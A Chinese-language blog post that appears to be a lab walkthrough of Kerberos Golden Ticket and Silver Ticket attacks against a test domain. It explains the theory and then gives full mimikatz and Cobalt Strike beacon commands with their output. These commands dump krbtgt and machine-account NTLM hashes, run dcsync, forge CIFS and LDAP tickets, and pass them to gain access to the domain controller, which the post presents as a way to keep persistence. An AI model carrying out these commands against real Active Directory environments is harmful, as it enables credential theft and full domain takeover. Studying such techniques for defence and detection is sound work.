---
title: 黄金票据&白银票据
published: 2025-03-09 16:46:27
tags: [内网安全,域渗透]
category: 安全
draft: false
---

# 黄金票据&白银票据

黄金票据是指能够绕过认证授权（Authentication and Authorization）机制并获得所需权限的票据。这种票据可以被攻击者收集和利用，从而从系统内部获取高权限，甚至完全控制系统

## 黄金票据 Golden Ticket

> https://www.freebuf.com/articles/others-articles/329728.html
> 

### 前置知识

1. **kerberos认证**
    - `KDC`（`Key Distribution Center`）密钥分发中心
        
        在KDC中又分为两个部分：`Authentication Service`(`AS`,身份验证服务)和`Ticket Granting Service`(`TGS`,票据授权服务)
        `AD`会维护一个`Account Database`(账户数据库). 它存储了域中所有用户的密码Hash和白名单。只有账户密码都在白名单中的`Client`才能申请到`TGT`。
        
    - `Kerberos`认证的大概流程：
        
        当 `Client` 想要访问 `Server` 上的某个服务时,需要先向 `AS` 证明自己的身份,验证通过后`AS`会发放的一个`TGT`,随后`Client`再次向`TGS`证明自己的身份,验证通过后`TGS`会发放一个`ST`,最后`Client`向 `Server` 
        
        发起认证请求,这个过程分为三块：Client 与 AS 的交互，Client 与 TGS 的交互，Client 与 Server 的交互。
        
    
    黄金票据是伪造`TGT`，白银票据则是伪造`ST`
    
2. 黄金票据
    - 在`Kerberos`认证中
        
        Client通过AS(身份认证服务)认证后,`AS`会给`Client`一个`Logon Session Key`和`TGT`,而`Logon Session Key`并不会保存在`KDC`中，`krbtgt`的`NTLM Hash`又是固定的,所以只要得到`krbtgt`的`NTLM Hash`，就可以伪造`TGT`和`Logon Session Key`来进入下一步`Client`与`TGS`的交互。而已有了金票后，就跳过`AS`验证,不用验证账户和密码，所以也不担心域管密码修改。
        
    - 黄金票据常用于权限维持。
        
        当我们获得域控的控制权限后，有可能获取域内所有用户的`hash`，和`krbtgt`的hash。这时，由于一些原因导致我们失去对目标的控制权，但是我们还留有一个普通用户的权限，并且`krbtgt`的密码没有更改，此时我们可以利用`krbtgt`用户的`ntlm hash`制作黄金票据伪造`tgt`，重新获取域控的管理权限。
        

### 所需条件

域名称，域的SID值，域的KRBTGT账号的HASH，伪造任意用户名

获取域的`SID`和`KRBTGT`账号的`NTLM HASH`的前提是需要已经拿到了域的权限

### 实验

- 条件已经拿到了域的权限
1. 获取域SID以及域名称
    
    ![image.png](image%2028.png)
    
    ![image.png](image%2029.png)
    
    域名称`god.org` ,`SID`为`S-1-5-21-2952760202-1353902439-2381784089` 后面的`500`不需要
    
2. 获取`KRBTGT` 的`NTLM`的`HASH`
    
    我这里使用`CS`抓取
    
    ```python
    beacon> hashdump
    [*] Tasked beacon to dump hashes
    [+] host called home, sent: 82541 bytes
    [+] received password hashes:
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    krbtgt:502:aad3b435b51404eeaad3b435b51404ee:58e91a5ac358d86513ab224312314061:::
    liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:f98564f9c7fab916678466075899f6e1:::
    ligang:1106:aad3b435b51404eeaad3b435b51404ee:1e3d22f88dfd250c9312d21686c60f41:::
    OWA$:1001:aad3b435b51404eeaad3b435b51404ee:35c29a27ff5086ba975d49493673eddb:::
    ROOT-TVI862UBEH$:1104:aad3b435b51404eeaad3b435b51404ee:c1e8fa40153fef225ce4f3d627181bcf:::
    STU1$:1105:aad3b435b51404eeaad3b435b51404ee:75c2c82fa50b7716428d85372374b139:::
    DEV1$:1107:aad3b435b51404eeaad3b435b51404ee:bed18e5b9d13bb384a3041a10d43c01b:::
    ```
    
    `KRBTGT` 的`NTLM`的`HASH` 是`58e91a5ac358d86513ab224312314061`
    
3. 我们已经拿到制作票据需要的信息，然后换到一台普通的域内机器
    
    通过网络访问域控文件像是`access is denied` 无权限
    
    ![image.png](image%2030.png)
    
4. 制作黄金票据,将`mimikatz`拿到客户机
    
    格式：kerberos::golden /user:XXX任意用户名 /domain:域名 /sid:域的sid值 /ticket:XXX.kirbi(生成的票据名称)
    
    ![image.png](image%2031.png)
    
    生成成功
    
5. 使用`klist`查看生成的票据
    
    ![image.png](image%2032.png)
    
6. 再通过网络访问域控文件，成功获取
    
    ![image.png](image%2033.png)
    

## 白银票据

白银票据就是伪造ST票据

### 原理

在kerberos认证的第三步，即AP-REQ~AP-REP，Client带着ST以及KDC使用Service Session key加密的Authenticator（指Serivce Session Key加密的时间戳）发送给服务端，服务器接收到Client的请求后，使用服务密钥解开ST，然后取出Service Session key解密Authenticator，然后检验对方身份，以及权限等，验证成功就让 Client 访问server上的指定服务了

在白银票据攻击中，攻击者重点伪造的是 `PAC_SERVER_CHECKSUM`，因为它是服务端验证 PAC 的关键，服务端通常不会验证 `PAC_PRIVSVR_CHECKSUM`，因为这个字段主要是供 KDC 使用

白银票据成功的前提就是检查PAC签名时不检查`PAC_PRIVSVR_CHECKSUM`

### 所需条件

- 域名
- 域SID
- 目标服务器名
- 可利用的服务
- 服务账号的NTML HASH
- 需要伪造的用户名

### 实验 CIFS服务 以及 LDAP

1. 目标主机 NTML HASH 或者AES256的获取
    - 如果有域中的管理员账号可以使用`dcsync`读取
        
        ```python
        mimikatz # lsadump::dcsync /domain:god.org /all /csv
        [DC] 'god.org' will be the domain
        [DC] 'owa.god.org' will be the DC server
        [DC] Exporting domain 'god.org'
        502	krbtgt	58e91a5ac358d86513ab224312314061	514
        1106	ligang	1e3d22f88dfd250c9312d21686c60f41	512
        1107	DEV1$	bed18e5b9d13bb384a3041a10d43c01b	4128
        1104	ROOT-TVI862UBEH$	6bbf3561300bef0e1f8e3fadec53500e	4096
        1001	OWA$	5f7687a3b909b00386ca167919e883d1	532480
        1000	liukaifeng01	f98564f9c7fab916678466075899f6e1	544
        500	Administrator	f98564f9c7fab916678466075899f6e1	512
        1105	STU1$	b9116b875737a6fc3dcc996369db2505	4128
        1108	a	685c5f49ed0f0821ca58781a0b902f2e	66048
        ```
        
        我们所需的是`1001	OWA$	5f7687a3b909b00386ca167919e883d1	532480` 这个是域控主机的，不过这样就可以拿到`krbtgt`的`HASH`来制作金票了
        
    - 或者枚举出管理员账户等
2. 域名以及SID等
    
    ```python
    C:\Users\Administrator>whoami /all
    
    用户信息
    ----------------
    
    用户名            SID
    ================= =============================================
    god\administrator S-1-5-21-2952760202-1353902439-2381784089-500
    ```
    
    域名：`god.org`
    
3. 可利用的服务，有很多
    
    通常是`cifs` ，用于和主机文件共享（IPC）
    
    `LDAP` ，可以实现ldap查询或者执行`dcsync` ，可用于获得账户密码信息
    
4. 制作`cifs`服务白银票据
    
    可以使用mimikatz线上或者线下，或者离线制作
    
    - `mimikatz` 制作`cifs`服务白银票据
        
        ```python
        kerberos::golden /domain:域名 /sid:SID /target:目标机器 /service:服务名 /rc4:NTLM-HASH /user:administrator /ptt
        /ptt：加上制作后默认直接打入内存中，不会生成文件
        ```
        
        使用上边的信息制作
        
        ```python
        mimikatz # kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /service:cifs /rc4:5f7687a3b909b00386ca167919e883d1 /user:administrator
        User      : administrator
        Domain    : god.org (GOD)
        SID       : S-1-5-21-2952760202-1353902439-2381784089
        User Id   : 500
        Groups Id : *513 512 520 518 519 
        ServiceKey: 5f7687a3b909b00386ca167919e883d1 - rc4_hmac_nt      
        Service   : cifs
        Target    : owa.god.org
        Lifetime  : 2024/11/22 15:06:57 ; 2034/11/20 15:06:57 ; 2034/11/20 15:06:57
        -> Ticket : ticket.kirbi
        
         * PAC generated
         * PAC signed
         * EncTicketPart generated
         * EncTicketPart encrypted
         * KrbCred generated
        
        Final Ticket Saved to file !
        ```
        
        会在当前目录生成`ticket.kirbi` 
        
    - 未导入前
        
        ```python
        C:\Users\a>dir \\owa.god.org\c$
        拒绝访问。
        ```
        
    - 将白银票据导入，先将当前票据清除,然后将票据导入
        
        ```python
        # cmd
        klist purge
        # mimikatz
        kerberos::ptt C:\users\a\Desktop\ticket.kirbi 
        ```
        
        导入后使用`klist`命令查看导入票据
        
        ```python
        C:\Users\a>klist
        
        当前登录 ID 是 0:0x4a1a38
        
        缓存的票证: (1)
        
        #0>     客户端: administrator @ god.org
                服务器: cifs/owa.god.org @ god.org
                Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)
                票证标志 0x40a00000 -> forwardable renewable pre_authent
                开始时间: 11/22/2024 15:06:57 (本地)
                结束时间:   11/20/2034 15:06:57 (本地)
                续订时间: 11/20/2034 15:06:57 (本地)
                会话密钥类型: RSADSI RC4-HMAC(NT)
        ```
        
    - 再次访问`OWA`的`cifs`服务
        
        ```python
        C:\Users\a>dir \\owa.god.org\c$
         驱动器 \\owa.god.org\c$ 中的卷没有标签。
         卷的序列号是 1E4D-1970
        
         \\owa.god.org\c$ 的目录
        
        2019/10/13  13:06    <DIR>          ExchangeSetupLogs
        2019/08/24  21:55    <DIR>          inetpub
        2009/07/14  11:20    <DIR>          PerfLogs
        2019/08/24  21:34    <DIR>          Program Files
        2019/08/24  21:34    <DIR>          Program Files (x86)
        2019/10/13  18:01    <DIR>          redis
        2024/11/21  21:58    <DIR>          Users
        2024/11/21  21:59    <DIR>          Windows
                       0 个文件              0 字节
                       8 个目录 13,935,308,800 可用字节
        ```
        
        后面可以通过`copy`将木马文件传递过去
        
5. 制作`LDAP` 服务白银票据及利用
    - 假如现在上线了域内一台主机，并且得到了域管理员用户 ，现在要需要控制域控（**Kerberoasting**）
        
        ![image.png](image%2034.png)
        
        ```python
        beacon> shell whoami
        [*] Tasked beacon to run: whoami
        [+] host called home, sent: 74 bytes
        [+] received output:
        god\administrator
        
        shell net user administrator /domain
        可允许的登录小时数     All
        
        本地组成员             *Administrators       
        全局组成员             *Enterprise Admins    *Schema Admins        
                               *Domain Users         *Domain Admins        
                               *Group Policy Creator 
        命令成功完成。
        ```
        
    - 查看SID值
        
        ```python
        beacon> shell whoami /all
        [*] Tasked beacon to run: whoami /all
        [+] host called home, sent: 89 bytes
        [+] received output:
        用户信息
        ----------------
        
        用户名            SID                                          
        ================= =============================================
        god\administrator S-1-5-21-2952760202-1353902439-2381784089-500
        ```
        
        域控是`owa.god.org`
        
    - 制作LDAP银票直接导入内存
        
        ```python
        kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /service:LDAP /rc4:5f7687a3b909b00386ca167919e883d1 /user:administrator /ptt
        ```
        
        ```python
        beacon> mimikatz kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /service:LDAP /rc4:5f7687a3b909b00386ca167919e883d1 /user:administrator /ptt
        [*] Tasked beacon to run mimikatz's kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /target:owa.god.org /service:LDAP /rc4:5f7687a3b909b00386ca167919e883d1 /user:administrator /ptt command
        [+] host called home, sent: 813682 bytes
        [+] received output:
        User      : administrator
        Domain    : god.org (GOD)
        SID       : S-1-5-21-2952760202-1353902439-2381784089
        User Id   : 500
        Groups Id : *513 512 520 518 519 
        ServiceKey: 5f7687a3b909b00386ca167919e883d1 - rc4_hmac_nt      
        Service   : LDAP
        Target    : owa.god.org
        Lifetime  : 2024/11/22 16:02:01 ; 2034/11/20 16:02:01 ; 2034/11/20 16:02:01
        -> Ticket : ** Pass The Ticket **
        
         * PAC generated
         * PAC signed
         * EncTicketPart generated
         * EncTicketPart encrypted
         * KrbCred generated
        
        Golden ticket for 'administrator @ god.org' successfully submitted for current session
        ```
        
    - 查看是否导入成功
        
        ```python
        beacon> shell klist
        [*] Tasked beacon to run: klist
        [+] host called home, sent: 36 bytes
        [+] received output:
        
        当前登录 ID 是 0:0xacf16
        
        缓存的票证: (1)
        
        #0>	客户端: administrator @ god.org
        	服务器: LDAP/owa.god.org @ god.org
        	Kerberos 票证加密类型: RSADSI RC4-HMAC(NT)
        	票证标志 0x40a00000 -> forwardable renewable pre_authent 
        	开始时间: 11/22/2024 16:02:01 (本地)
        	结束时间:   11/20/2034 16:02:01 (本地)
        	续订时间: 11/20/2034 16:02:01 (本地)
        	会话密钥类型: RSADSI RC4-HMAC(NT)
        ```
        
    - 通过dcsync查询域控上的hash值
        
        ```python
        beacon> mimikatz lsadump::dcsync /domain:god.org /all /csv
        [*] Tasked beacon to run mimikatz's lsadump::dcsync /domain:god.org /all /csv command
        [+] host called home, sent: 813681 bytes
        [+] received output:
        [DC] 'god.org' will be the domain
        [DC] 'owa.god.org' will be the DC server
        [DC] Exporting domain 'god.org'
        [rpc] Service  : ldap
        [rpc] AuthnSvc : GSS_NEGOTIATE (9)
        502	krbtgt	58e91a5ac358d86513ab224312314061	514
        1106	ligang	1e3d22f88dfd250c9312d21686c60f41	512
        1107	DEV1$	bed18e5b9d13bb384a3041a10d43c01b	4128
        1104	ROOT-TVI862UBEH$	6bbf3561300bef0e1f8e3fadec53500e	4096
        1001	OWA$	5f7687a3b909b00386ca167919e883d1	532480
        1000	liukaifeng01	f98564f9c7fab916678466075899f6e1	544
        500	Administrator	f98564f9c7fab916678466075899f6e1	512
        1105	STU1$	b9116b875737a6fc3dcc996369db2505	4128
        1108	a	685c5f49ed0f0821ca58781a0b902f2e	66048
        ```
        
    - 然后可以通过`krbtgt`的`hash`值制作金票
    - 然后再通过之前的方法上线
    
    ## 总结
    
    金票需要拿到krbtgt用户的hash，银票需要拿到服务账号hash，银票更加隐蔽，因为不用经过KDC，通常都是用于权限维持，一般都要在拿到权限后捏造